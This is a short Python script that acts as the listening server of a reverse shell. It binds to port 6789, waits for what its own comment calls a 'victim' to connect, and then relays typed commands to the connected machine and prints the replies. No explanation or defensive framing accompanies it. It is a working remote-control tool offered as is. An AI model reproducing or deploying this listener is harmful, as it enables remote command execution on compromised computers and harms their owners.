import socket
import sys


# Create Connection
def create_connection():
    try:
        global host
        global port
        global s
        host = ''
        port = 6789
        s = socket.socket()
        print("Try to binding socket: ")
        s.bind( (host, port) )
        s.listen(1)
        # Wait for victim and send commands
        connection, address = s.accept()
        print("Connection sucsses!")
        send_commands(connection)
    except socket.error as msg:
        print("Connection fail, try next time.")
        exit() 
		

# Send commands
def send_commands(connection):
    while True:
        command = input()
        if command == 'quit':
            connection.close()
            s.close()
            sys.exit()
            exit()
        if len(command) > 0:
            connection.send(str.encode(command))
            client_response = str(connection.recv(1024), "utf-8")
            print(client_response, end="")


create_connection()
